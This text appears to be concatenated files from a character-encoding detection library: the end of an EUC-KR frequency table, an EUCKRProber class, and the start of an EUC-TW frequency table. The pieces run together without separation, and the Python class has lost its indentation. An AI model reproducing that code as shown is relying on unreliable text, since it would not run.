8528,8529,8530,8531,8532,8533,8534,8535,8536,8537,8538,8539,8540,8541,8542,8543,
8544,8545,8546,8547,8548,8549,8550,8551,8552,8553,8554,8555,8556,8557,8558,8559,
8560,8561,8562,8563,8564,8565,8566,8567,8568,8569,8570,8571,8572,8573,8574,8575,
8576,8577,8578,8579,8580,8581,8582,8583,8584,8585,8586,8587,8588,8589,8590,8591,
8592,8593,8594,8595,8596,8597,8598,8599,8600,8601,8602,8603,8604,8605,8606,8607,
8608,8609,8610,8611,8612,8613,8614,8615,8616,8617,8618,8619,8620,8621,8622,8623,
8624,8625,8626,8627,8628,8629,8630,8631,8632,8633,8634,8635,8636,8637,8638,8639,
8640,8641,8642,8643,8644,8645,8646,8647,8648,8649,8650,8651,8652,8653,8654,8655,
8656,8657,8658,8659,8660,8661,8662,8663,8664,8665,8666,8667,8668,8669,8670,8671,
8672,8673,8674,8675,8676,8677,8678,8679,8680,8681,8682,8683,8684,8685,8686,8687,
8688,8689,8690,8691,8692,8693,8694,8695,8696,8697,8698,8699,8700,8701,8702,8703,
8704,8705,8706,8707,8708,8709,8710,8711,8712,8713,8714,8715,8716,8717,8718,8719,
8720,8721,8722,8723,8724,8725,8726,8727,8728,8729,8730,8731,8732,8733,8734,8735,
8736,8737,8738,8739,8740,8741)
from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import EUCKRDistributionAnalysis
from .mbcssm import EUCKRSMModel
class EUCKRProber(MultiByteCharSetProber):
def __init__(self):
MultiByteCharSetProber.__init__(self)
self._mCodingSM = CodingStateMachine(EUCKRSMModel)
self._mDistributionAnalyzer = EUCKRDistributionAnalysis()
self.reset()
def get_charset_name(self):
return "EUC-KR"
EUCTW_TYPICAL_DISTRIBUTION_RATIO = 0.75
EUCTW_TABLE_SIZE = 8102
EUCTWCharToFreqOrder = (
1,1800,1506, 255,1431, 198,   9,  82,   6,7310, 177, 202,3615,1256,2808, 110,
3735,  33,3241, 261,  76,  44,2113,  16,2931,2184,1176, 659,3868,  26,3404,2643,
1198,3869,3313,4060, 410,2211, 302, 590, 361,1963,   8, 204,  58,4296,7311,1931,
63,7312,7313, 317,1614,  75, 222, 159,4061,2412,1480,7314,3500,3068, 224,2809,
3616,   3,  10,3870,1471,  29,2774,1135,2852,1939, 873, 130,3242,1123, 312,7315,
4297,2051, 507, 252, 682,7316, 142,1914, 124, 206,2932,  34,3501,3173,  64, 604,
7317,2494,1976,1977, 155,1990, 645, 641,1606,7318,3405, 337,  72, 406,7319,  80,
630, 238,3174,1509, 263, 939,1092,2644, 756,1440,1094,3406, 449,  69,2969, 591,
179,2095, 471, 115,2034,1843,  60,  50,2970, 134, 806,1868, 734,2035,3407, 180,
995,1607, 156, 537,2893, 688,7320, 319,1305, 779,2144, 514,2374, 298,4298, 359,
2495,  90,2707,1338, 663,  11, 906,1099,2545,  20,2436, 182, 532,1716,7321, 732,
1376,4062,1311,1420,3175,  25,2312,1056, 113, 399, 382,1949, 242,3408,2467, 529,
3243, 475,1447,3617,7322, 117,  21, 656, 810,1297,2295,2329,3502,7323, 126,4063,
706, 456, 150, 613,4299,  71,1118,2036,4064, 145,3069,  85, 835, 486,2114,1246,
1426, 428, 727,1285,1015, 800, 106, 623, 303,1281,7324,2127,2354, 347,3736, 221,
3503,3110,7325,1955,1153,4065,  83, 296,1199,3070, 192, 624,  93,7326, 822,1897,
2810,3111, 795,2064, 991,1554,1542,1592,  27,  43,2853, 859, 139,1456, 860,4300,
437, 712,3871, 164,2392,3112, 695, 211,3017,2096, 195,3872,1608,3504,3505,3618,
3873, 234, 811,2971,2097,3874,2229,1441,3506,1615,2375, 668,2076,1638, 305, 228,
1664,4301, 467, 415,7327, 262,2098,1593, 239, 108, 300, 200,1033, 512,1247,2077,
7328,7329,2173,3176,3619,2673, 593, 845,1062,3244,  88,1723,2037,3875,1950, 212,
266, 152, 149, 468,1898,4066,4302,  77, 187,7330,3018,  37,   5,2972,7331,3876,
7332,7333,  39,2517,4303,2894,3177,2078,  55, 148,  74,4304, 545, 483,1474,1029,
1665, 217,1869,1531,3113,1104,2645,4067,  24, 172,3507, 900,3877,3508,3509,4305,
32,1408,2811,1312, 329, 487,2355,2247,2708, 784,2674,   4,3019,3314,1427,1788,
188, 109, 499,7334,3620,1717,1789, 888,1217,3020,4306,7335,3510,7336,3315,1520,
3621,3878, 196,1034, 775,7337,7338, 929,1815, 249, 439,  38,7339,1063,7340, 794,
3879,1435,2296,  46, 178,3245,2065,7341,2376,7342, 214,1709,4307, 804,  35, 707,
324,3622,1601,2546, 140, 459,4068,7343,7344,1365, 839, 272, 978,2257,2572,3409,
2128,1363,3623,1423, 697, 100,3071,  48,  70,1231, 495,3114,2193,7345,1294,7346,
2079, 462, 586,1042,3246, 853, 256, 988, 185,2377,3410,1698, 434,1084,7347,3411,
314,2615,2775,4308,2330,2331, 569,2280, 637,1816,2518, 757,1162,1878,1616,3412,
287,1577,2115, 768,4309,1671,2854,3511,2519,1321,3737, 909,2413,7348,4069, 933,
3738,7349,2052,2356,1222,4310, 765,2414,1322, 786,4311,7350,1919,1462,1677,2895,
1699,7351,4312,1424,2437,3115,3624,2590,3316,1774,1940,3413,3880,4070, 309,1369,
1130,2812, 364,2230,1653,1299,3881,3512,3882,3883,2646, 525,1085,3021, 902,2000,
1475, 964,4313, 421,1844,1415,1057,2281, 940,1364,3116, 376,4314,4315,1381,   7,
2520, 983,2378, 336,1710,2675,1845, 321,3414, 559,1131,3022,2742,1808,1132,1313,
265,1481,1857,7352, 352,1203,2813,3247, 167,1089, 420,2814, 776, 792,1724,3513,
4071,2438,3248,7353,4072,7354, 446, 229, 333,2743, 901,3739,1200,1557,4316,2647,
1920, 395,2744,2676,3740,4073,1835, 125, 916,3178,2616,4317,7355,7356,3741,7357,
7358,7359,4318,3117,3625,1133,2547,1757,3415,1510,2313,1409,3514,7360,2145, 438,
2591,2896,2379,3317,1068, 958,3023, 461, 311,2855,2677,4074,1915,3179,4075,1978,
383, 750,2745,2617,4076, 274, 539, 385,1278,1442,7361,1154,1964, 384, 561, 210,
98,1295,2548,3515,7362,1711,2415,1482,3416,3884,2897,1257, 129,7363,3742, 642,
523,2776,2777,2648,7364, 141,2231,1333,  68, 176, 441, 876, 907,4077, 603,2592,
710, 171,3417, 404, 549,  18,3118,2393,1410,3626,1666,7365,3516,4319,2898,4320,
7366,2973, 368,7367, 146, 366,  99, 871,3627,1543, 748, 807,1586,1185,  22,2258,
379,3743,3180,7368,3181, 505,1941,2618,1991,1382,2314,7369, 380,2357, 218, 702,
1817,1248,3418,3024,3517,3318,3249,7370,2974,3628, 930,3250,3744,7371,  59,7372,
585, 601,4078, 497,3419,1112,1314,4321,1801,7373,1223,1472,2174,7374, 749,1836,
690,1899,3745,1772,3885,1476, 429,1043,1790,2232,2116, 917,4079, 447,1086,1629,
7375, 556,7376,7377,2020,1654, 844,1090, 105, 550, 966,1758,2815,1008,1782, 686,
1095,7378,2282, 793,1602,7379,3518,2593,4322,4080,2933,2297,4323,3746, 980,2496,
544, 353, 527,4324, 908,2678,2899,7380, 381,2619,1942,1348,7381,1341,1252, 560,
3072,7382,3420,2856,7383,2053, 973, 886,2080, 143,4325,7384,7385, 157,3886, 496,
4081,  57, 840, 540,2038,4326,4327,3421,2117,1445, 970,2259,1748,1965,2081,4082,
3119,1234,1775,3251,2816,3629, 773,1206,2129,1066,2039,1326,3887,1738,1725,4083,
279,3120,  51,1544,2594, 423,1578,2130,2066, 173,4328,1879,7386,7387,1583, 264,
610,3630,4329,2439, 280, 154,7388,7389,7390,1739, 338,1282,3073, 693,2857,1411,
1074,3747,2440,7391,4330,7392,7393,1240, 952,2394,7394,2900,1538,2679, 685,1483,
4084,2468,1436, 953,4085,2054,4331, 671,2395,  79,4086,2441,3252, 608, 567,2680,
3422,4087,4088,1691, 393,1261,1791,2396,7395,4332,7396,7397,7398,7399,1383,1672,
3748,3182,1464, 522,1119, 661,1150, 216, 675,4333,3888,1432,3519, 609,4334,2681,
2397,7400,7401,7402,4089,3025,   0,7403,2469, 315, 231,2442, 301,3319,4335,2380,
7404, 233,4090,3631,1818,4336,4337,7405,  96,1776,1315,2082,7406, 257,7407,1809,
3632,2709,1139,1819,4091,2021,1124,2163,2778,1777,2649,7408,3074, 363,1655,3183,
7409,2975,7410,7411,7412,3889,1567,3890, 718, 103,3184, 849,1443, 341,3320,2934,
1484,7413,1712, 127,  67, 339,4092,2398, 679,1412, 821,7414,7415, 834, 738, 351,
2976,2146, 846, 235,1497,1880, 418,1992,3749,2710, 186,1100,2147,2746,3520,1545,
1355,2935,2858,1377, 583,3891,4093,2573,2977,7416,1298,3633,1078,2549,3634,2358,
78,3750,3751, 267,1289,2099,2001,1594,4094, 348, 369,1274,2194,2175,1837,4338,
1820,2817,3635,2747,2283,2002,4339,2936,2748, 144,3321, 882,4340,3892,2749,3423,
4341,2901,7417,4095,1726, 320,7418,3893,3026, 788,2978,7419,2818,1773,1327,2859,
3894,2819,7420,1306,4342,2003,1700,3752,3521,2359,2650, 787,2022, 506, 824,3636,
534, 323,4343,1044,3322,2023,1900, 946,3424,7421,1778,1500,1678,7422,1881,4344,
165, 243,4345,3637,2521, 123, 683,4096, 764,4346,  36,3895,1792, 589,2902, 816,
626,1667,3027,2233,1639,1555,1622,3753,3896,7423,3897,2860,1370,1228,1932, 891,
2083,2903, 304,4097,7424, 292,2979,2711,3522, 691,2100,4098,1115,4347, 118, 662,
7425, 611,1156, 854,2381,1316,2861,   2, 386, 515,2904,7426,7427,3253, 868,2234,
1486, 855,2651, 785,2212,3028,7428,1040,3185,3523,7429,3121, 448,7430,1525,7431,
2164,4348,7432,3754,7433,4099,2820,3524,3122, 503, 818,3898,3123,1568, 814, 676,
1444, 306,1749,7434,3755,1416,1030, 197,1428, 805,2821,1501,4349,7435,7436,7437,
1993,7438,4350,7439,7440,2195,  13,2779,3638,2980,3124,1229,1916,7441,3756,2131,
7442,4100,4351,2399,3525,7443,2213,1511,1727,1120,7444,7445, 646,3757,2443, 307,
7446,7447,1595,3186,7448,7449,7450,3639,1113,1356,3899,1465,2522,2523,7451, 519,
7452, 128,2132,  92,2284,1979,7453,3900,1512, 342,3125,2196,7454,2780,2214,1980,
3323,7455, 290,1656,1317, 789, 827,2360,7456,3758,4352, 562, 581,3901,7457, 401,
4353,2248,  94,4354,1399,2781,7458,1463,2024,4355,3187,1943,7459, 828,1105,4101,
1262,1394,7460,4102, 605,4356,7461,1783,2862,7462,2822, 819,2101, 578,2197,2937,
7463,1502, 436,3254,4103,3255,2823,3902,2905,3425,3426,7464,2712,2315,7465,7466,
2332,2067,  23,4357, 193, 826,3759,2102, 699,1630,4104,3075, 390,1793,1064,3526,
7467,1579,3076,3077,1400,7468,4105,1838,1640,2863,7469,4358,4359, 137,4106, 598,
3078,1966, 780, 104, 974,2938,7470, 278, 899, 253, 402, 572, 504, 493,1339,7471,
3903,1275,4360,2574,2550,7472,3640,3029,3079,2249, 565,1334,2713, 863,  41,7473,
7474,4361,7475,1657,2333,  19, 463,2750,4107, 606,7476,2981,3256,1087,2084,1323,
2652,2982,7477,1631,1623,1750,4108,2682,7478,2864, 791,2714,2653,2334, 232,2416,
7479,2983,1498,7480,2654,2620, 755,1366,3641,3257,3126,2025,1609, 119,1917,3427,
862,1026,4109,7481,3904,3760,4362,3905,4363,2260,1951,2470,7482,1125, 817,4110,
4111,3906,1513,1766,2040,1487,4112,3030,3258,2824,3761,3127,7483,7484,1507,7485,
2683, 733,  40,1632,1106,2865, 345,4113, 841,2524, 230,4364,2984,1846,3259,3428,
7486,1263, 986,3429,7487, 735, 879, 254,1137, 857, 622,1300,1180,1388,1562,3907,
3908,2939, 967,2751,2655,1349, 592,2133,1692,3324,2985,1994,4114,1679,3909,1901,
2185,7488, 739,3642,2715,1296,1290,7489,4115,2198,2199,1921,1563,2595,2551,1870,
2752,2986,7490, 435,7491, 343,1108, 596,  17,1751,4365,2235,3430,3643,7492,4366,
294,3527,2940,1693, 477, 979, 281,2041,3528, 643,2042,3644,2621,2782,2261,1031,
2335,2134,2298,3529,4367, 367,1249,2552,7493,3530,7494,4368,1283,3325,2004, 240,
1762,3326,4369,4370, 836,1069,3128, 474,7495,2148,2525, 268,3531,7496,3188,1521,
1284,7497,1658,1546,4116,7498,3532,3533,7499,4117,3327,2684,1685,4118, 961,1673,
2622, 190,2005,2200,3762,4371,4372,7500, 570,2497,3645,1490,7501,4373,2623,3260,
1956,4374, 584,1514, 396,1045,1944,7502,4375,1967,2444,7503,7504,4376,3910, 619,
7505,3129,3261, 215,2006,2783,2553,3189,4377,3190,4378, 763,4119,3763,4379,7506,
7507,1957,1767,2941,3328,3646,1174, 452,1477,4380,3329,3130,7508,2825,1253,2382,
2186,1091,2285,4120, 492,7509, 638,1169,1824,2135,1752,3911, 648, 926,1021,1324,
4381, 520,4382, 997, 847,1007, 892,4383,3764,2262,1871,3647,7510,2400,1784,4384,
1952,2942,3080,3191,1728,4121,2043,3648,4385,2007,1701,3131,1551,  30,2263,4122,
7511,2026,4386,3534,7512, 501,7513,4123, 594,3431,2165,1821,3535,3432,3536,3192,
829,2826,4124,7514,1680,3132,1225,4125,7515,3262,4387,4126,3133,2336,7516,4388,
4127,7517,3912,3913,7518,1847,2383,2596,3330,7519,4389, 374,3914, 652,4128,4129,
375,1140, 798,7520,7521,7522,2361,4390,2264, 546,1659, 138,3031,2445,4391,7523,
2250, 612,1848, 910, 796,3765,1740,1371, 825,3766,3767,7524,2906,2554,7525, 692,
444,3032,2624, 801,4392,4130,7526,1491, 244,1053,3033,4131,4132, 340,7527,3915,
1041,2987, 293,1168,  87,1357,7528,1539, 959,7529,2236, 721, 694,4133,3768, 219,
1478, 644,1417,3331,2656,1413,1401,1335,1389,3916,7530,7531,2988,2362,3134,1825,
730,1515, 184,2827,  66,4393,7532,1660,2943, 246,3332, 378,1457, 226,3433, 975,
3917,2944,1264,3537, 674, 696,7533, 163,7534,1141,2417,2166, 713,3538,3333,4394,
3918,7535,7536,1186,  15,7537,1079,1070,7538,1522,3193,3539, 276,1050,2716, 758,
1126, 653,2945,3263,7539,2337, 889,3540,3919,3081,2989, 903,1250,4395,3920,3434,
3541,1342,1681,1718, 766,3264, 286,  89,2946,3649,7540,1713,7541,2597,3334,2990,
7542,2947,2215,3194,2866,7543,4396,2498,2526, 181, 387,1075,3921, 731,2187,3335,
7544,3265, 310, 313,3435,2299, 770,4134,  54,3034, 189,4397,3082,3769,3922,7545,
1230,1617,1849, 355,3542,4135,4398,3336, 111,4136,3650,1350,3135,3436,3035,4137,
2149,3266,3543,7546,2784,3923,3924,2991, 722,2008,7547,1071, 247,1207,2338,2471,
1378,4399,2009, 864,1437,1214,4400, 373,3770,1142,2216, 667,4401, 442,2753,2555,
3771,3925,1968,4138,3267,1839, 837, 170,1107, 934,1336,1882,7548,7549,2118,4139,
2828, 743,1569,7550,4402,4140, 582,2384,1418,3437,7551,1802,7552, 357,1395,1729,
3651,3268,2418,1564,2237,7553,3083,3772,1633,4403,1114,2085,4141,1532,7554, 482,
2446,4404,7555,7556,1492, 833,1466,7557,2717,3544,1641,2829,7558,1526,1272,3652,
4142,1686,1794, 416,2556,1902,1953,1803,7559,3773,2785,3774,1159,2316,7560,2867,
4405,1610,1584,3036,2419,2754, 443,3269,1163,3136,7561,7562,3926,7563,4143,2499,
3037,4406,3927,3137,2103,1647,3545,2010,1872,4144,7564,4145, 431,3438,7565, 250,
97,  81,4146,7566,1648,1850,1558, 160, 848,7567, 866, 740,1694,7568,2201,2830,
3195,4147,4407,3653,1687, 950,2472, 426, 469,3196,3654,3655,3928,7569,7570,1188,
424,1995, 861,3546,4148,3775,2202,2685, 168,1235,3547,4149,7571,2086,1674,4408,
3337,3270, 220,2557,1009,7572,3776, 670,2992, 332,1208, 717,7573,7574,3548,2447,
3929,3338,7575, 513,7576,1209,2868,3339,3138,4409,1080,7577,7578,7579,7580,2527,
3656,3549, 815,1587,3930,3931,7581,3550,3439,3777,1254,4410,1328,3038,1390,3932,
1741,3933,3778,3934,7582, 236,3779,2448,3271,7583,7584,3657,3780,1273,3781,4411,
7585, 308,7586,4412, 245,4413,1851,2473,1307,2575, 430, 715,2136,2449,7587, 270,
199,2869,3935,7588,3551,2718,1753, 761,1754, 725,1661,1840,4414,3440,3658,7589,
7590, 587,  14,3272, 227,2598, 326, 480,2265, 943,2755,3552, 291, 650,1883,7591,
1702,1226, 102,1547,  62,3441, 904,4415,3442,1164,4150,7592,7593,1224,1548,2756,
391, 498,1493,7594,1386,1419,7595,2055,1177,4416, 813, 880,1081,2363, 566,1145,
4417,2286,1001,1035,2558,2599,2238, 394,1286,7596,7597,2068,7598,  86,1494,1730,
3936, 491,1588, 745, 897,2948, 843,3340,3937,2757,2870,3273,1768, 998,2217,2069,
397,1826,1195,1969,3659,2993,3341, 284,7599,3782,2500,2137,2119,1903,7600,3938,
2150,3939,4151,1036,3443,1904, 114,2559,4152, 209,1527,7601,7602,2949,2831,2625,
2385,2719,3139, 812,2560,7603,3274,7604,1559, 737,1884,3660,1210, 885,  28,2686,
3553,3783,7605,4153,1004,1779,4418,7606, 346,1981,2218,2687,4419,3784,1742, 797,
1642,3940,1933,1072,1384,2151, 896,3941,3275,3661,3197,2871,3554,7607,2561,1958,
4420,2450,1785,7608,7609,7610,3942,4154,1005,1308,3662,4155,2720,4421,4422,1528,
2600, 161,1178,4156,1982, 987,4423,1101,4157, 631,3943,1157,3198,2420,1343,1241,
1016,2239,2562, 372, 877,2339,2501,1160, 555,1934, 911,3944,7611, 466,1170, 169,
1051,2907,2688,3663,2474,2994,1182,2011,2563,1251,2626,7612, 992,2340,3444,1540,
2721,1201,2070,2401,1996,2475,7613,4424, 528,1922,2188,1503,1873,1570,2364,3342,
3276,7614, 557,1073,7615,1827,3445,2087,2266,3140,3039,3084, 767,3085,2786,4425,
1006,4158,4426,2341,1267,2176,3664,3199, 778,3945,3200,2722,1597,2657,7616,4427,
7617,3446,7618,7619,7620,3277,2689,1433,3278, 131,  95,1504,3946, 723,4159,3141,
1841,3555,2758,2189,3947,2027,2104,3665,7621,2995,3948,1218,7622,3343,3201,3949,
4160,2576, 248,1634,3785, 912,7623,2832,3666,3040,3786, 654,  53,7624,2996,7625,
1688,4428, 777,3447,1032,3950,1425,7626, 191, 820,2120,2833, 971,4429, 931,3202,
135, 664, 783,3787,1997, 772,2908,1935,3951,3788,4430,2909,3203, 282,2723, 640,
1372,3448,1127, 922, 325,3344,7627,7628, 711,2044,7629,7630,3952,2219,2787,1936,
3953,3345,2220,2251,3789,2300,7631,4431,3790,1258,3279,3954,3204,2138,2950,3955,
3956,7632,2221, 258,3205,4432, 101,1227,7633,3280,1755,7634,1391,3281,7635,2910,
2056, 893,7636,7637,7638,1402,4161,2342,7639,7640,3206,3556,7641,7642, 878,1325,
1780,2788,4433, 259,1385,2577, 744,1183,2267,4434,7643,3957,2502,7644, 684,1024,
4162,7645, 472,3557,3449,1165,3282,3958,3959, 322,2152, 881, 455,1695,1152,1340,
660, 554,2153,4435,1058,4436,4163, 830,1065,3346,3960,4437,1923,7646,1703,1918,
7647, 932,2268, 122,7648,4438, 947, 677,7649,3791,2627, 297,1905,1924,2269,4439,
2317,3283,7650,7651,4164,7652,4165,  84,4166, 112, 989,7653, 547,1059,3961, 701,
3558,1019,7654,4167,7655,3450, 942, 639, 457,2301,2451, 993,2951, 407, 851, 494,
4440,3347, 927,7656,1237,7657,2421,3348, 573,4168, 680, 921,2911,1279,1874, 285,
790,1448,1983, 719,2167,7658,7659,4441,3962,3963,1649,7660,1541, 563,7661,1077,
7662,3349,3041,3451, 511,2997,3964,3965,3667,3966,1268,2564,3350,3207,4442,4443,
7663, 535,1048,1276,1189,2912,2028,3142,1438,1373,2834,2952,1134,2012,7664,4169,
1238,2578,3086,1259,7665, 700,7666,2953,3143,3668,4170,7667,4171,1146,1875,1906,
4444,2601,3967, 781,2422, 132,1589, 203, 147, 273,2789,2402, 898,1786,2154,3968,
3969,7668,3792,2790,7669,7670,4445,4446,7671,3208,7672,1635,3793, 965,7673,1804,
2690,1516,3559,1121,1082,1329,3284,3970,1449,3794,  65,1128,2835,2913,2759,1590,
3795,7674,7675,  12,2658,  45, 976,2579,3144,4447, 517,2528,1013,1037,3209,7676,
3796,2836,7677,3797,7678,3452,7679,2602, 614,1998,2318,3798,3087,2724,2628,7680,
2580,4172, 599,1269,7681,1810,3669,7682,2691,3088, 759,1060, 489,1805,3351,3285,
1358,7683,7684,2386,1387,1215,2629,2252, 490,7685,7686,4173,1759,2387,2343,7687,
4448,3799,1907,3971,2630,1806,3210,4449,3453,3286,2760,2344, 874,7688,7689,3454,
3670,1858,  91,2914,3671,3042,3800,4450,7690,3145,3972,2659,7691,3455,1202,1403,
3801,2954,2529,1517,2503,4451,3456,2504,7692,4452,7693,2692,1885,1495,1731,3973,
2365,4453,7694,2029,7695,7696,3974,2693,1216, 237,2581,4174,2319,3975,3802,4454,
4455,2694,3560,3457, 445,4456,7697,7698,7699,7700,2761,  61,3976,3672,1822,3977,
7701, 687,2045, 935, 925, 405,2660, 703,1096,1859,2725,4457,3978,1876,1367,2695,
3352, 918,2105,1781,2476, 334,3287,1611,1093,4458, 564,3146,3458,3673,3353, 945,
2631,2057,4459,7702,1925, 872,4175,7703,3459,2696,3089, 349,4176,3674,3979,4460,
3803,4177,3675,2155,3980,4461,4462,4178,4463,2403,2046, 782,3981, 400, 251,4179,
1624,7704,7705, 277,3676, 299,1265, 476,1191,3804,2121,4180,4181,1109, 205,7706,
2582,1000,2156,3561,1860,7707,7708,7709,4464,7710,4465,2565, 107,2477,2157,3982,
3460,3147,7711,1533, 541,1301, 158, 753,4182,2872,3562,7712,1696, 370,1088,4183,
4466,3563, 579, 327, 440, 162,2240, 269,1937,1374,3461, 968,3043,  56,1396,3090,
2106,3288,3354,7713,1926,2158,4467,2998,7714,3564,7715,7716,3677,4468,2478,7717,
2791,7718,1650,4469,7719,2603,7720,7721,3983,2661,3355,1149,3356,3984,3805,3985,
7722,1076,  49,7723, 951,3211,3289,3290, 450,2837, 920,7724,1811,2792,2366,4184,
1908,1138,2367,3806,3462,7725,3212,4470,1909,1147,1518,2423,4471,3807,7726,4472,
2388,2604, 260,1795,3213,7727,7728,3808,3291, 708,7729,3565,1704,7730,3566,1351,
1618,3357,2999,1886, 944,4185,3358,4186,3044,3359,4187,7731,3678, 422, 413,1714,
3292, 500,2058,2345,4188,2479,7732,1344,1910, 954,7733,1668,7734,7735,3986,2404,
4189,3567,3809,4190,7736,2302,1318,2505,3091, 133,3092,2873,4473, 629,  31,2838,
2697,3810,4474, 850, 949,4475,3987,2955,1732,2088,4191,1496,1852,7737,3988, 620,
3214, 981,1242,3679,3360,1619,3680,1643,3293,2139,2452,1970,1719,3463,2168,7738,
3215,7739,7740,3361,1828,7741,1277,4476,1565,2047,7742,1636,3568,3093,7743, 869,
2839, 655,3811,3812,3094,3989,3000,3813,1310,3569,4477,7744,7745,7746,1733, 558,
4478,3681, 335,1549,3045,1756,4192,3682,1945,3464,1829,1291,1192, 470,2726,2107,
2793, 913,1054,3990,7747,1027,7748,3046,3991,4479, 982,2662,3362,3148,3465,3216,
3217,1946,2794,7749, 571,4480,7750,1830,7751,3570,2583,1523,2424,7752,2089, 984,
4481,3683,1959,7753,3684, 852, 923,2795,3466,3685, 969,1519, 999,2048,2320,1705,
7754,3095, 615,1662, 151, 597,3992,2405,2321,1049, 275,4482,3686,4193, 568,3687,
3571,2480,4194,3688,7755,2425,2270, 409,3218,7756,1566,2874,3467,1002, 769,2840,
194,2090,3149,3689,2222,3294,4195, 628,1505,7757,7758,1763,2177,3001,3993, 521,
1161,2584,1787,2203,2406,4483,3994,1625,4196,4197, 412,  42,3096, 464,7759,2632,
4484,3363,1760,1571,2875,3468,2530,1219,2204,3814,2633,2140,2368,4485,4486,3295,
1651,3364,3572,7760,7761,3573,2481,3469,7762,3690,7763,7764,2271,2091, 460,7765,
4487,7766,3002, 962, 588,3574, 289,3219,2634,1116,  52,7767,3047,1796,7768,7769,
7770,1467,7771,1598,1143,3691,4198,1984,1734,1067,4488,1280,3365, 465,4489,1572,
510,7772,1927,2241,1812,1644,3575,7773,4490,3692,7774,7775,2663,1573,1534,7776,
7777,4199, 536,1807,1761,3470,3815,3150,2635,7778,7779,7780,4491,3471,2915,1911,
2796,7781,3296,1122, 377,3220,7782, 360,7783,7784,4200,1529, 551,7785,2059,3693,
1769,2426,7786,2916,4201,3297,3097,2322,2108,2030,4492,1404, 136,1468,1479, 672,
1171,3221,2303, 271,3151,7787,2762,7788,2049, 678,2727, 865,1947,4493,7789,2013,
3995,2956,7790,2728,2223,1397,3048,3694,4494,4495,1735,2917,3366,3576,7791,3816,
509,2841,2453,2876,3817,7792,7793,3152,3153,4496,4202,2531,4497,2304,1166,1010,
552, 681,1887,7794,7795,2957,2958,3996,1287,1596,1861,3154, 358, 453, 736, 175,
478,1117, 905,1167,1097,7796,1853,1530,7797,1706,7798,2178,3472,2287,3695,3473,
3577,4203,2092,4204,7799,3367,1193,2482,4205,1458,2190,2205,1862,1888,1421,3298,
2918,3049,2179,3474, 595,2122,7800,3997,7801,7802,4206,1707,2636, 223,3696,1359,
751,3098, 183,3475,7803,2797,3003, 419,2369, 633, 704,3818,2389, 241,7804,7805,
7806, 838,3004,3697,2272,2763,2454,3819,1938,2050,3998,1309,3099,2242,1181,7807,
1136,2206,3820,2370,1446,4207,2305,4498,7808,7809,4208,1055,2605, 484,3698,7810,
3999, 625,4209,2273,3368,1499,4210,4000,7811,4001,4211,3222,2274,2275,3476,7812,
7813,2764, 808,2606,3699,3369,4002,4212,3100,2532, 526,3370,3821,4213, 955,7814,
1620,4214,2637,2427,7815,1429,3700,1669,1831, 994, 928,7816,3578,1260,7817,7818,
7819,1948,2288, 741,2919,1626,4215,2729,2455, 867,1184, 362,3371,1392,7820,7821,
4003,4216,1770,1736,3223,2920,4499,4500,1928,2698,1459,1158,7822,3050,3372,2877,
1292,1929,2506,2842,3701,1985,1187,2071,2014,2607,4217,7823,2566,2507,2169,3702,
2483,3299,7824,3703,4501,7825,7826, 666,1003,3005,1022,3579,4218,7827,4502,1813,
2253, 574,3822,1603, 295,1535, 705,3823,4219, 283, 858, 417,7828,7829,3224,4503,
4504,3051,1220,1889,1046,2276,2456,4004,1393,1599, 689,2567, 388,4220,7830,2484,
802,7831,2798,3824,2060,1405,2254,7832,4505,3825,2109,1052,1345,3225,1585,7833,
809,7834,7835,7836, 575,2730,3477, 956,1552,1469,1144,2323,7837,2324,1560,2457,
3580,3226,4005, 616,2207,3155,2180,2289,7838,1832,7839,3478,4506,7840,1319,3704,
3705,1211,3581,1023,3227,1293,2799,7841,7842,7843,3826, 607,2306,3827, 762,2878,
1439,4221,1360,7844,1485,3052,7845,4507,1038,4222,1450,2061,2638,4223,1379,4508,
2585,7846,7847,4224,1352,1414,2325,2921,1172,7848,7849,3828,3829,7850,1797,1451,
7851,7852,7853,7854,2922,4006,4007,2485,2346, 411,4008,4009,3582,3300,3101,4509,
1561,2664,1452,4010,1375,7855,7856,  47,2959, 316,7857,1406,1591,2923,3156,7858,
1025,2141,3102,3157, 354,2731, 884,2224,4225,2407, 508,3706, 726,3583, 996,2428,
3584, 729,7859, 392,2191,1453,4011,4510,3707,7860,7861,2458,3585,2608,1675,2800,
919,2347,2960,2348,1270,4511,4012,  73,7862,7863, 647,7864,3228,2843,2255,1550,
1346,3006,7865,1332, 883,3479,7866,7867,7868,7869,3301,2765,7870,1212, 831,1347,
4226,4512,2326,3830,1863,3053, 720,3831,4513,4514,3832,7871,4227,7872,7873,4515,
7874,7875,1798,4516,3708,2609,4517,3586,1645,2371,7876,7877,2924, 669,2208,2665,
2429,7878,2879,7879,7880,1028,3229,7881,4228,2408,7882,2256,1353,7883,7884,4518,
3158, 518,7885,4013,7886,4229,1960,7887,2142,4230,7888,7889,3007,2349,2350,3833,
516,1833,1454,4014,2699,4231,4519,2225,2610,1971,1129,3587,7890,2766,7891,2961,
1422, 577,1470,3008,1524,3373,7892,7893, 432,4232,3054,3480,7894,2586,1455,2508,
2226,1972,1175,7895,1020,2732,4015,3481,4520,7896,2733,7897,1743,1361,3055,3482,
2639,4016,4233,4521,2290, 895, 924,4234,2170, 331,2243,3056, 166,1627,3057,1098,
7898,1232,2880,2227,3374,4522, 657, 403,1196,2372, 542,3709,3375,1600,4235,3483,
7899,4523,2767,3230, 576, 530,1362,7900,4524,2533,2666,3710,4017,7901, 842,3834,
7902,2801,2031,1014,4018, 213,2700,3376, 665, 621,4236,7903,3711,2925,2430,7904,
2431,3302,3588,3377,7905,4237,2534,4238,4525,3589,1682,4239,3484,1380,7906, 724,
2277, 600,1670,7907,1337,1233,4526,3103,2244,7908,1621,4527,7909, 651,4240,7910,
1612,4241,2611,7911,2844,7912,2734,2307,3058,7913, 716,2459,3059, 174,1255,2701,
4019,3590, 548,1320,1398, 728,4020,1574,7914,1890,1197,3060,4021,7915,3061,3062,
3712,3591,3713, 747,7916, 635,4242,4528,7917,7918,7919,4243,7920,7921,4529,7922,
3378,4530,2432, 451,7923,3714,2535,2072,4244,2735,4245,4022,7924,1764,4531,7925,
4246, 350,7926,2278,2390,2486,7927,4247,4023,2245,1434,4024, 488,4532, 458,4248,
4025,3715, 771,1330,2391,3835,2568,3159,2159,2409,1553,2667,3160,4249,7928,2487,
2881,2612,1720,2702,4250,3379,4533,7929,2536,4251,7930,3231,4252,2768,7931,2015,
2736,7932,1155,1017,3716,3836,7933,3303,2308, 201,1864,4253,1430,7934,4026,7935,
